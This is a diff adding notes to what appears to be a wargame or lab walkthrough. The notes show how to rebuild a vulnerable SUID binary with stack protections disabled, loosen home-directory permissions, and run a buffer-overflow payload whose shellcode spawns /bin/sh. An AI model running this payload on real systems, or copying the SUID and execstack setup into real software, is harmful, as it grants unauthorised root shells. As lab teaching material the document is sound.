@@ -188,3 +188,15 @@ here is a convenient one-liner:
 # Recreate the exploitable binary
 # ------------------------------------------------------------------------
 
+# As user level3, compile the exploit in /tmp
+gcc source.c -fno-stack-protector -z execstack
+
+# Edit suid
+chmod u+s a.out
+
+# Move the exploit to level3 home directory
+chmod +wx ~; mv a.out ~
+
+# Now user level2 can run the exploit
+(python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xef'[::-1])" ; cat) | /home/user/level3/a.out
+
